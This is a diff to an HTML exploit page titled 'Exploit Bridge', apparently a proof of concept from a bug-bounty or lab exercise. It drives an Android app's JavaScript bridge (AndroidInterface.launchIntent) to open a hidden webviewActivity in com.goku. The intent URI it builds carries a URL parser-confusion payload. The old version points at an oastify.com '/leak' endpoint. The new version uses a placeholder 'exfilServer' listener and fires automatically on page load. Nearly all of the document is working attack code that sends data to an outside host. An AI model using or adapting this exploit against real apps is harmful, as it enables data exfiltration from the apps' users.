@@ -1,10 +1,28 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-  <body>
+<head>
+    <title>Exploit Bridge</title>
+</head>
+<body>
+    <h2>Exploiting...</h2>
     <script>
-      AndroidInterface.launchIntent(
-        'intent://x/#Intent;component=com.goku/.webviewActivity;S.url=http://www.getonecard.app\\@jnat7xdmij0m520jcshsf6u06rci0co1.oastify.com/leak;end'
-      );
+        // REPLACE this with your listener IP/domain from Step 3.1
+        var exfilServer = "192.168.1.40"; 
+
+        // Construct the Intent targeting the hidden webviewActivity
+        // S.url passes the URL with the parser confusion payload
+        var intentUri = "intent:#Intent;" +
+                        "component=com.goku/.webviewActivity;" +
+                        "S.url=https://" + exfilServer + "\\@www.getonecard.app/capture;" +
+                        "end";
+
+        window.onload = function() {
+            if (window.AndroidInterface && typeof window.AndroidInterface.launchIntent === "function") {
+                window.AndroidInterface.launchIntent(intentUri);
+            } else {
+                console.log("AndroidInterface bridge not found.");
+            }
+        };
     </script>
-  </body>
+</body>
 </html>
